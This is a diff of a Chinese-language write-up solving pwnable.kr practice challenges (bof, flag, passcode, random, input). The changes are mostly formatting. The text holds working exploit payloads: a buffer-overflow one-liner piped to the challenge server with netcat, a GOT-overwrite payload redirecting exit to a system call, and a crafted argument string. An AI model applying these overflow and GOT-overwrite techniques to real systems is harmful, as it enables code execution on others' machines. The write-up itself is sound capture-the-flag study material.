@@ -1,4 +1,4 @@
-#bof
+# bof
 ```
 import struct
 padding = 'A'*52 #这里不是算的
@@ -13,10 +13,11 @@ print padding + key_addr
 知道这个之后就可以利用python加管道进行pwn<br>
 (python -c 'print "A"*52+"\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000<br>
 
-#flag
+# flag
 IDA打开之后就看到upx的字符，猜测是upx壳，linux下看了一下，apt安装下upx然后就可以解壳了<br>
 
-#passcode
+# passcode
+
 这题完全不知道怎么做，然后看国外大牛的wp。理解了半天，没懂。<br>
 然后自己gdb调试，，忽然想起来，在调用welcome之后和调用login之后，<br>
 esp的地址一样，这样因为函数开始的时候都有mov    ebp,esp。<br>
@@ -32,7 +33,8 @@ welcome:
 login:
 0x0804857c <+24>:   mov    edx,DWORD PTR [ebp-0x10]
 ```
-之后就是直接的plt利用了，不过这个也是理解了不少时间，实际上就是call exit的时候，实际上是先执行jmp _exit (_exit就是实际上exit的地址，而采用全局偏移表的方式存储，只要把这个地方改掉就行了。)
+之后就是直接的plt利用了，不过这个也是理解了不少时间，实际上就是call exit的时候，
+实际上是先执行jmp _exit (_exit就是实际上exit的地址，而采用全局偏移表的方式存储，只要把这个地方改掉就行了。)
 ```
 0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5
 0x080485de <+122>:   call   0x848450 <puts@plt>
@@ -44,11 +46,11 @@ system("")对应的地址：0x080485d7 = 134514135<br>
 偏移表中exit对应的地址804a018<br>
 于是就可以'A'*96 + '\x18\xa0\x04\x08' + '134514135\n'<br>
 
-#random
+# random
 开始看的rand没有思路，然而，，，如此简单。<br>
 rand需要先srand初始化化下时间种子，否则rand的返回值一直固定。然后利用异或的性质，ok<br>
 
-#input
+# input
 ```
 ./input `python -c "print 'A '*47 + '\x00' + '\x20\x0a\x0d'"`
 ```
